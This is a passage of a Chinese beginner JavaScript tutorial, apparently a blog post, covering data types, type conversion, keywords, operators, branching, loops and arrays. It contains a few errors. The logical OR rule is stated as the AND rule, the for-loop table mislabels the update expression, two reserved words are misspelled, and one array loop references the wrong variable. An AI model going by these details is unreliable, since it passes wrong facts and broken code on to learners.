console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'你好'</span> <span class="token operator">+</span> variable<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 你好undefined</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">11</span> <span class="token operator">+</span> variable<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// NaN</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token boolean">true</span> <span class="token operator">+</span> variable<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//  NaN</span></code></pre>
<p>一个声明变量给 null 值，里面存的值为空（学习对象时，我们继续研究null)</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> vari <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'你好'</span> <span class="token operator">+</span> vari<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 你好null</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">11</span> <span class="token operator">+</span> vari<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 11</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token boolean">true</span> <span class="token operator">+</span> vari<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//  1</span></code></pre>
<h4 id="获取变量数据类型">获取变量数据类型</h4>
<p>typeof 可用来获取检测变量的数据类型</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> num <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> num<span class="token punctuation">)</span> <span class="token comment">// 结果 number      </span></code></pre>
<p>不同类型的返回值</p>
<p><img src="https://s2.loli.net/2022/01/25/Y4lS7UNWBmHaJFI.png" alt=""></p>
<h4 id="数据类型转换">数据类型转换</h4>
<p>​		什么是数据类型转换？</p>
<p>​		使用表单、prompt 获取过来的数据默认是字符串类型的，此时就不能直接简单的进行加法运算，而需要转换变量的数据类型。通俗来说，就是把一种数据类型的变量转换成另一种数据类型，通常会实现3种方式的转换：</p>
<ul>
<li>转换为字符串类型</li>
<li>转换为数字型</li>
<li>转换为布尔型</li>
</ul>
<h5 id="转换为字符串">转换为字符串</h5>
<p><img src="https://s2.loli.net/2022/01/25/cd6ru7M9xmBXHLN.png" alt=""></p>
<ul>
<li>
<p>toString() 和 String()  使用方式不一样。</p>
</li>
<li>
<p>三种转换方式，更多第三种加号拼接字符串转换方式， 这一种方式也称之为隐式转换。</p>
</li>
<li>
<p>转换为数字型（重点）</p>
<p><img src="https://s2.loli.net/2022/01/25/5FoIemtAvELnOMX.png" alt=""></p>
<ul>
<li>注意 parseInt 和 parseFloat 单词的大小写，这2个是重点</li>
<li>隐式转换是我们在进行算数运算的时候，JS 自动转换了数据类型</li>
</ul>
</li>
</ul>
<h5 id="转换为布尔型">转换为布尔型</h5>
<p><img src="https://s2.loli.net/2022/01/25/1VZIid5HDmS7On6.png" alt=""></p>
<ul>
<li>
<p>代表空、否定的值会被转换为 false  ，如 ‘’、0、NaN、null、undefined</p>
</li>
<li>
<p>其余值都会被转换为 true</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token number">NaN</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token string">'小白'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span></code></pre>
</li>
</ul>
<h3 id="关键字和保留字">关键字和保留字</h3>
<h4 id="标识符">标识符</h4>
<p>标识(zhi)符：就是指开发人员为变量、属性、函数、参数取的名字。</p>
<p>标识符不能是关键字或保留字。</p>
<h4 id="关键字">关键字</h4>
<p>关键字：是指 JS本身已经使用了的字，不能再用它们充当变量名、方法名。</p>
<p>包括：break、case、catch、continue、default、delete、do、else、finally、for、function、if、in、instanceof、new、return、switch、this、throw、try、typeof、var、void、while、with 等。</p>
<h4 id="保留字">保留字</h4>
<p>保留字：实际上就是预留的“关键字”，意思是现在虽然还不是关键字，但是未来可能会成为关键字，同样不能使用它们当变量名或方法名。</p>
<p>包括：boolean、byte、char、class、const、debugger、double、enum、export、extends、fimal、float、goto、implements、import、int、interface、long、mative、package、private、protected、public、short、static、super、synchronized、throws、transient、volatile 等。</p>
<p>注意：如果将保留字用作变量名或函数名，那么除非将来的浏览器实现了该保留字，否则很可能收不到任何错误消息。当浏览器将其实现后，该单词将被看做关键字，如此将出现关键字错误。</p>
<h2 id="程序的逻辑">程序的逻辑</h2>
<h3 id="运算符（操作符）">运算符（操作符）</h3>
<h4 id="递增和递减运算符">递增和递减运算符</h4>
<p>递增和递减运算符概述</p>
<p>如果需要反复给数字变量添加或减去1，可以使用递增（++）和递减（ – ）运算符来完成。</p>
<p>在 JavaScript 中，递增（++）和递减（ – ）既可以放在变量前面，也可以放在变量后面。放在变量前面时，我们可以称为前置递增（递减）运算符，放在变量后面时，我们可以称为后置递增（递减）运算符。</p>
<p>注意：递增和递减运算符必须和变量配合使用。</p>
<p><strong>递增运算符</strong></p>
<ul>
<li>
<p>前置递增运算符</p>
<p>++num 前置递增，就是自加1，类似于 num =  num + 1，但是 ++num 写起来更简单。</p>
<p>使用口诀：先自加，后返回值</p>
</li>
</ul>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span>  num <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
<span class="token function">alert</span><span class="token punctuation">(</span><span class="token operator">++</span>num <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 21</span></code></pre>
<ul>
<li>
<p>后置递增运算符</p>
<p>num++ 后置递增，就是自加1，类似于 num =  num + 1 ，但是 num++ 写起来更简单。</p>
<p>使用口诀：先返回原值，后自加</p>
</li>
</ul>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span>  num <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
<span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">+</span> num<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 20</span></code></pre>
<h4 id="比较运算符">比较运算符</h4>
<p>比较运算符概述</p>
<p>概念：比较运算符（关系运算符）是两个数据进行比较时所使用的运算符，比较运算后，会返回一个布尔值（true / false）作为比较运算的结果。</p>
<p><img src="https://s2.loli.net/2022/01/25/rIMtDjcCL6TdPky.png" alt=""></p>
<p>等号比较</p>
<p><img src="https://s2.loli.net/2022/01/25/5Qg3mhzOZkwTDnv.png" alt=""></p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">18</span> <span class="token operator">==</span> <span class="token string">'18'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">18</span> <span class="token operator">===</span> <span class="token string">'18'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre>
<h4 id="逻辑运算符">逻辑运算符</h4>
<p>逻辑运算符概述</p>
<p>概念：逻辑运算符是用来进行布尔值运算的运算符，其返回值也是布尔值。后面开发中经常用于多个条件的判断</p>
<p><img src="D:/Hexo/source/_posts/javascript/assets/%25E5%259B%25BE%25E7%2589%25874-1594236524538.png" alt=""></p>
<ul>
<li>
<p>逻辑与&amp;&amp;</p>
<p>两边都是 true才返回 true，否则返回 false</p>
</li>
<li>
<p>逻辑或 ||</p>
<p>两边都是 true才返回 true，否则返回 false</p>
</li>
<li>
<p>逻辑非 ！</p>
<p>逻辑非（!）也叫作取反符，用来取一个布尔值相反的值，如 true 的相反值是 false</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> isOk <span class="token operator">=</span> <span class="token operator">!</span><span class="token boolean">true</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>isOk<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// false</span></code></pre>
</li>
<li>
<p>短路运算（逻辑中断）</p>
<p>短路运算的原理：当有多个表达式（值）时,左边的表达式值可以确定结果时,就不再继续运算右边的表达式的值;</p>
<ul>
<li>
<p>逻辑与</p>
<p>语法： 表达式1 &amp;&amp; 表达式2</p>
<ul>
<li>如果第一个表达式的值为真，则返回表达式2</li>
<li>如果第一个表达式的值为假，则返回表达式1</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token number">123</span> <span class="token operator">&amp;&amp;</span> <span class="token number">456</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 456</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token number">456</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 0</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token number">123</span> <span class="token operator">&amp;&amp;</span> <span class="token number">456</span><span class="token operator">&amp;&amp;</span> <span class="token number">789</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 789</span></code></pre>
<ul>
<li>
<p>逻辑或</p>
<p>语法： 表达式1 || 表达式2</p>
<p>如果第一个表达式的值为真，则返回表达式1</p>
<p>如果第一个表达式的值为假，则返回表达式2</p>
 <pre class="language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token number">123</span> <span class="token operator">||</span> <span class="token number">456</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">//  123</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token number">0</span> <span class="token operator">||</span>  <span class="token number">456</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//  456</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token number">123</span> <span class="token operator">||</span> <span class="token number">456</span> <span class="token operator">||</span> <span class="token number">789</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//  123</span></code></pre>
</li>
</ul>
<h4 id="运算符优先级">运算符优先级</h4>
<p><img src="https://s2.loli.net/2022/01/25/TXZCOmI4KJiSvqj.png" alt=""></p>
<ul>
<li>一元运算符里面的逻辑非优先级很高</li>
<li>逻辑与比逻辑或优先级高</li>
</ul>
<h3 id="流程控制">流程控制</h3>
<h4 id="分支流程控制">分支流程控制</h4>
<ul>
<li>
<p>分支结构</p>
<p>由上到下执行代码的过程中，根据不同的条件，执行不同的路径代码（执行代码多选一的过程），从而得到不同的结果.</p>
<p>JS 语言提供了两种分支结构语句：if 语句、switch 语句</p>
</li>
<li>
<p>if 语句</p>
<ul>
<li>语法结构</li>
</ul>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 条件成立执行代码，否则什么也不做</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>条件表达式<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 条件成立执行的代码语句</span>
<span class="token punctuation">&#125;</span></code></pre>
</li>
</ul>
<p>语句可以理解为一个行为，循环语句和分支语句就是典型的语句。一个程序由很多个语句组成，一般情况下，会分割成一个一个的语句。</p>
<ul>
<li>
<p>执行流程</p>
<p><img src="https://s2.loli.net/2022/01/25/LY6Scb74rkGaMA1.png" alt=""></p>
</li>
<li>
<p>if else语句（双分支语句）</p>
<ul>
<li>
<p>语法结构</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 条件成立  执行 if 里面代码，否则执行else 里面的代码</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>条件表达式<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// [如果] 条件成立执行的代码</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// [否则] 执行的代码</span>
<span class="token punctuation">&#125;</span></code></pre>
</li>
<li>
<p>执行流程</p>
<p><img src="https://s2.loli.net/2022/01/25/sg1MBUdGKecSvH4.png" alt=""></p>
</li>
</ul>
</li>
<li>
<p>if else if 语句(多分支语句)</p>
<ul>
<li>
<p>语法结构</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 适合于检查多重条件。</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>条件表达式<span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    语句<span class="token number">1</span>；
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>条件表达式<span class="token number">2</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>
    语句<span class="token number">2</span>；
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>条件表达式<span class="token number">3</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>
   语句<span class="token number">3</span>；
 <span class="token operator">...</span><span class="token punctuation">.</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 上述条件都不成立执行此处代码</span>
<span class="token punctuation">&#125;</span></code></pre>
</li>
<li>
<p>执行逻辑</p>
</li>
</ul>
<p><img src="https://s2.loli.net/2022/01/25/o94BpbOwCua7Dik.png" alt=""></p>
</li>
</ul>
<h4 id="三元表达式">三元表达式</h4>
<ul>
<li>
<p>语法结构</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">表达式<span class="token number">1</span> <span class="token operator">?</span> 表达式<span class="token number">2</span> <span class="token operator">:</span> 表达式<span class="token number">3</span><span class="token punctuation">;</span></code></pre>
</li>
<li>
<p>执行思路</p>
<ul>
<li>如果表达式1为 true ，则返回表达式2的值，如果表达式1为 false，则返回表达式3的值</li>
<li>简单理解： 就类似于  if  else （双分支） 的简写</li>
</ul>
</li>
</ul>
<h4 id="switch分支流程控制">switch分支流程控制</h4>
<ul>
<li>
<p>语法结构</p>
<p>switch 语句也是多分支语句，它用于基于不同的条件来执行不同的代码。当要针对变量设置一系列的特定值的选项时，就可以使用 switch。</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">switch</span><span class="token punctuation">(</span> 表达式 <span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
    <span class="token keyword">case</span> value1<span class="token operator">:</span>
        <span class="token comment">// 表达式 等于 value1 时要执行的代码</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> value2<span class="token operator">:</span>
        <span class="token comment">// 表达式 等于 value2 时要执行的代码</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">default</span><span class="token operator">:</span>
        <span class="token comment">// 表达式 不等于任何一个 value 时要执行的代码</span>
<span class="token punctuation">&#125;</span></code></pre>
</li>
<li>
<p>switch ：开关 转换  ， case ：小例子   选项</p>
</li>
<li>
<p>关键字 switch 后面括号内可以是表达式或值， 通常是一个变量</p>
</li>
<li>
<p>关键字 case , 后跟一个选项的表达式或值，后面跟一个冒号</p>
</li>
<li>
<p>switch 表达式的值会与结构中的 case 的值做比较</p>
</li>
<li>
<p>如果存在匹配全等(===) ，则与该 case 关联的代码块会被执行，并在遇到 break 时停止，整个 switch 语句代码执行结束</p>
</li>
<li>
<p>如果所有的 case 的值都和表达式的值不匹配，则执行 default 里的代码</p>
<p><strong>注意： 执行case 里面的语句时，如果没有break，则继续执行下一个case里面的语句。</strong></p>
</li>
</ul>
<h3 id="循环">循环</h3>
<h4 id="for循环">for循环</h4>
<p>语法结构</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span><span class="token punctuation">(</span>初始化变量<span class="token punctuation">;</span> 条件表达式<span class="token punctuation">;</span> 操作表达式 <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token comment">//循环体</span>
<span class="token punctuation">&#125;</span></code></pre>
<table>
<thead>
<tr>
<th>名称</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>初始化变量</td>
<td>通常被用于初始化一个计数器，该表达式可以使用 var 关键字声明新的变量，这个变量帮我们来记录次数。</td>
</tr>
<tr>
<td>条件表达式</td>
<td>用于确定每一次循环是否能被执行。如果结果是 true 就继续循环，否则退出循环。</td>
</tr>
<tr>
<td>操作表达式</td>
<td>用于确定每一次循环是否能被执行。如果结果是 true 就继续循环，否则退出循环。</td>
</tr>
</tbody>
</table>
<p><strong>执行过程：</strong></p>
<ol>
<li>初始化变量，初始化操作在整个 for 循环只会执行一次。</li>
</ol>
<ul>
<li>执行条件表达式，如果为true，则执行循环体语句，否则退出循环，循环结束。</li>
</ul>
<ol>
<li>执行操作表达式，此时第一轮结束。</li>
<li>第二轮开始，直接去执行条件表达式（不再初始化变量），如果为 true ，则去执行循环体语句，否则退出循环。</li>
<li>继续执行操作表达式，第二轮结束。</li>
<li>后续跟第二轮一致，直至条件表达式为假，结束整个 for 循环。</li>
</ol>
<p><strong>断点调试：</strong></p>
<p>断点调试是指自己在程序的某一行设置一个断点，调试时，程序运行到这一行就会停住，然后你可以一步一步往下调试，调试过程中可以看各个变量当前的值，出错的话，调试到出错的代码行即显示错误，停下。断点调试可以帮助观察程序的运行过程</p>
<p>断点调试的流程：<br>
1、浏览器中按 F12–&gt; sources --&gt;找到需要调试的文件–&gt;在程序的某一行设置断点<br>
2、Watch: 监视，通过watch可以监视变量的值的变化，非常的常用。<br>
3、摁下F11，程序单步执行，让程序一行一行的执行，这个时候，观察watch中变量的值的变化。</p>
<ul>
<li>
<p>for 循环重复不相同的代码</p>
<p>例如，求输出1到100岁：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//  基本写法</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'这个人今年'</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">'岁了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>例如，求输出1到100岁，并提示出生、死亡</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// for 里面是可以添加其他语句的 </span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'这个人今年1岁了， 它出生了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'这个人今年100岁了，它死了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'这个人今年'</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">'岁了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>for循环因为有了计数器的存在，还可以重复的执行某些操作，比如做一些算术运算。</p>
</li>
</ul>
<h4 id="while循环">while循环</h4>
<p>while语句的语法结构如下：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">while</span> <span class="token punctuation">(</span>条件表达式<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 循环体代码 </span>
<span class="token punctuation">&#125;</span></code></pre>
<p>执行思路：</p>
<ul>
<li>1 先执行条件表达式，如果结果为 true，则执行循环体代码；如果为 false，则退出循环，执行后面代码</li>
<li>2 执行循环体代码</li>
<li>3 循环体代码执行完毕后，程序会继续判断执行条件表达式，如条件仍为true，则会继续执行循环体，直到循环条件为 false 时，整个循环过程才会结束</li>
</ul>
<p>注意：</p>
<ul>
<li>使用 while 循环时一定要注意，它必须要有退出条件，否则会成为死循环</li>
</ul>
<h4 id="do-while循环">do-while循环</h4>
<p>do… while 语句的语法结构如下：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">do</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 循环体代码 - 条件表达式为 true 时重复执行循环体代码</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span>条件表达式<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>执行思路</p>
<ul>
<li>
<p>1 先执行一次循环体代码</p>
</li>
<li>
<p>2 再执行条件表达式，如果结果为 true，则继续执行循环体代码，如果为 false，则退出循环，继续执行后面代码</p>
<p>注意：先再执行循环体，再判断，do…while循环语句至少会执行一次循环体代码</p>
</li>
</ul>
<h4 id="continue、break">continue、break</h4>
<p>与python一致</p>
<h3 id="数组">数组</h3>
<h4 id="数组的概念">数组的概念</h4>
<ul>
<li>数组可以把一组相关的数据一起存放，并提供方便的访问(获取）方式。</li>
<li>数组是指<strong>一组数据的集合</strong>，其中的每个数据被称作<strong>元素</strong>，在数组中可以<strong>存放任意类型的元素</strong>。数组是一种将一组数据存储在单个变量名下的优雅方式。</li>
</ul>
<h4 id="创建数组">创建数组</h4>
<p>JS 中创建数组有两种方式：</p>
<ul>
<li>
<p>利用  new 创建数组</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> 数组名 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ；
<span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 创建一个新的空数组</span></code></pre>
</li>
</ul>
<p>注意 Array () ，A 要大写</p>
<ul>
<li>
<p>利用数组字面量创建数组</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//1. 使用数组字面量方式创建空的数组</span>
<span class="token keyword">var</span>  数组名 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>；
<span class="token comment">//2. 使用数组字面量方式创建带初始值的数组</span>
<span class="token keyword">var</span>  数组名 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'小白'</span><span class="token punctuation">,</span><span class="token string">'小黑'</span><span class="token punctuation">,</span><span class="token string">'大黄'</span><span class="token punctuation">,</span><span class="token string">'瑞奇'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
</li>
<li>
<p>数组的字面量是方括号 [ ]</p>
<ul>
<li>声明数组并赋值称为数组的初始化</li>
<li>这种字面量方式也是我们以后最多使用的方式</li>
</ul>
</li>
<li>
<p>数组元素的类型</p>
<p>数组中可以存放任意类型的数据，例如字符串，数字，布尔值等。</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arrStus <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'小白'</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token number">28.9</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
</li>
</ul>
<h4 id="获取数组中的元素">获取数组中的元素</h4>
<p>索引 (下标) ：用来访问数组元素的序号（数组下标从 0 开始）。</p>
<p><img src="https://s2.loli.net/2022/01/25/xW9tA7iFJEzvlZK.png" alt=""></p>
<p>数组可以通过索引来访问、设置、修改对应的数组元素，可以通过“数组名[索引]”的形式来获取数组中的元素。</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 定义数组</span>
<span class="token keyword">var</span> arrStus <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment">// 获取数组中的第2个元素</span>
<span class="token function">alert</span><span class="token punctuation">(</span>arrStus<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </code></pre>
<p>注意：如果访问时数组没有和索引值对应的元素，则得到的值是undefined</p>
<h4 id="遍历数组">遍历数组</h4>
<ul>
<li>
<p>数组遍历</p>
<p>把数组中的每个元素从头到尾都访问一次（类似学生的点名），可以通过 for 循环索引遍历数组中的每一项</p>
</li>
</ul>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'red'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">,</span> <span class="token string">'blue'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arrStus<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<ul>
<li>
<p>数组的长度</p>
<p>数组的长度：默认情况下表示数组中元素的个数</p>
<p>使用“数组名.length”可以访问数组元素的数量（数组长度）。</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arrStus <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">alert</span><span class="token punctuation">(</span>arrStus<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 3</span></code></pre>
<p><strong>注意</strong>：</p>
</li>
<li>
<p>此处数组的长度是数组元素的个数 ，不要和数组的索引号混淆。</p>
</li>
<li>
<p>当我们数组里面的元素个数发生了变化，这个 length 属性跟着一起变化</p>
<ul>
<li>数组的length属性可以被修改：</li>
</ul>
</li>
<li>
<p>如果设置的length属性值大于数组的元素个数，则会在数组末尾出现空白元素；</p>
<ul>
<li>如果设置的length属性值小于数组的元素个数，则会把超过该值的数组元素删除</li>
</ul>
</li>
</ul>
<h4 id="数组中新增元素">数组中新增元素</h4>
